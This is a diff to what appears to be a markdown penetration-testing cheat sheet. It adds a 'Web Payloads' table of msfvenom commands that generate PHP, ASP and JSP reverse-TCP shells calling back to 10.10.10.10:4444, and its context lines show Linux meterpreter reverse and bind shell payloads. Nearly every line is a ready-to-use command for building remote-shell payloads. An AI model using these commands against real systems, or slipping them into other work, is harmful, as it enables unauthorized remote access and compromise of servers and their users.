@@ -74,3 +74,10 @@ Below are some different payload commands. I have grouped them with a heading to
 | Linux x64 Reverse TCP | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell_x86.elf` |
 | Linux Bind TCP | `msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf > bind_shell.elf` |
 
+### Web Payloads
+
+| Description | Command |
+| --- | --- |
+| PHP Reverse TCP | `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php` |
+| ASP Reverse TCP | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp > shell.asp` |
+| JSP Reverse TCP | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp` |
